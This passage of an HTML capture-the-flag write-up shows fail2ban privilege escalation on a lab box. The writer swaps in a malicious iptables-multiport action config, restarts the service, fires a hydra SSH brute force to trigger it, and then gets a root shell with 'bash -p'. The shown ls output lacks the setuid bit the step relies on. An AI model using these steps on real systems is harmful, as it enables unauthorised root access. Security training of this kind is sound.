                                                                                                                                                        one
                                                                                                                                                        into
                                                                                                                                                        that
                                                                                                                                                        directory.
                                                                                                                                                        <br>&rarr;
                                                                                                                                                        Be
                                                                                                                                                        sure
                                                                                                                                                        to
                                                                                                                                                        make
                                                                                                                                                        a
                                                                                                                                                        copy
                                                                                                                                                        of
                                                                                                                                                        the
                                                                                                                                                        original
                                                                                                                                                        first
                                                                                                                                                        in
                                                                                                                                                        case
                                                                                                                                                        you
                                                                                                                                                        screw
                                                                                                                                                        up
                                                                                                                                                        <br>&rarr;
                                                                                                                                                        We
                                                                                                                                                        need
                                                                                                                                                        to
                                                                                                                                                        do
                                                                                                                                                        it
                                                                                                                                                        this
                                                                                                                                                        was
                                                                                                                                                        because
                                                                                                                                                        we
                                                                                                                                                        don't
                                                                                                                                                        have
                                                                                                                                                        write
                                                                                                                                                        privs
                                                                                                                                                        for
                                                                                                                                                        that
                                                                                                                                                        directory
                                                                                                                                                        as
                                                                                                                                                        michael
                                                                                                                                                    </p>


                                                                                                                                                    <div
                                                                                                                                                        class="language-plaintext highlighter-rouge">
                                                                                                                                                        <div
                                                                                                                                                            class="highlight">
                                                                                                                                                            <pre
                                                                                                                                                                class="highlight"><code>
<span class="na">michael@trick:~$</span><span class="ld"><span class="kt"> rm </span> -f /etc/fail2ban/action.d/iptables-multiport.conf
</span> 
<span class="na">michael@trick:~$</span><span class="ld"><span class="kt"> mv </span> config.conf /etc/fail2ban/action.d/iptables-multiport.conf
</span>

</code></pre>

                                                                                                                                                            <p
                                                                                                                                                                class="head-img">
                                                                                                                                                                Now,
                                                                                                                                                                we
                                                                                                                                                                can
                                                                                                                                                                restart
                                                                                                                                                                the
                                                                                                                                                                fail2ban
                                                                                                                                                                service
                                                                                                                                                                and
                                                                                                                                                                brute
                                                                                                                                                                force
                                                                                                                                                                it
                                                                                                                                                                with
                                                                                                                                                                a
                                                                                                                                                                wordlist
                                                                                                                                                                to
                                                                                                                                                                trigger
                                                                                                                                                                our
                                                                                                                                                                malicious
                                                                                                                                                                code:
                                                                                                                                                            </p>

                                                                                                                                                            <div
                                                                                                                                                                class="language-plaintext highlighter-rouge">
                                                                                                                                                                <div
                                                                                                                                                                    class="highlight">
                                                                                                                                                                    <pre
                                                                                                                                                                        class="highlight"><code>
<span class="na">michael@trick:~$</span><span class="ld"><span class="kt"> sudo </span> /etc/init.d/fail2ban restart

[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
</span> </code></pre>

                                                                                                                                                                    <div
                                                                                                                                                                        class="language-plaintext highlighter-rouge">
                                                                                                                                                                        <div
                                                                                                                                                                            class="highlight">
                                                                                                                                                                            <pre
                                                                                                                                                                                class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> hydra </span> 10.10.11.166 ssh -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt

---SNIP---

[DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task
[DATA] attacking ssh://10.10.11.166:22/
</span> </code></pre>

                                                                                                                                                                            <p
                                                                                                                                                                                class="head-img">
                                                                                                                                                                                Back
                                                                                                                                                                                on
                                                                                                                                                                                our
                                                                                                                                                                                ssh
                                                                                                                                                                                with
                                                                                                                                                                                michael:
                                                                                                                                                                            </p>

                                                                                                                                                                            <div
                                                                                                                                                                                class="language-plaintext highlighter-rouge">
                                                                                                                                                                                <div
                                                                                                                                                                                    class="highlight">
                                                                                                                                                                                    <pre
                                                                                                                                                                                        class="highlight"><code>
<span class="na">michael@reick:~$</span><span class="ld"><span class="kt"> ls </span> -l /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
</span>
<span class="na">michael@trick:~$</span><span class="ld"><span class="kt"> bash </span> -p
</span>
<span class="na">bash-5.0#</span><span class="ld"><span class="kt"> whoami </span> 
root
</span>

</code></pre>

                                                                                                                                                                                </div>
                                                                                                                                                                            </div>

                                                                                                                                                                            <a
                                                                                                                                                                                href="#">Go
                                                                                                                                                                                back</a>
                                                                                                                                                                            </article>
        </main>
        </body>
</div>

</html>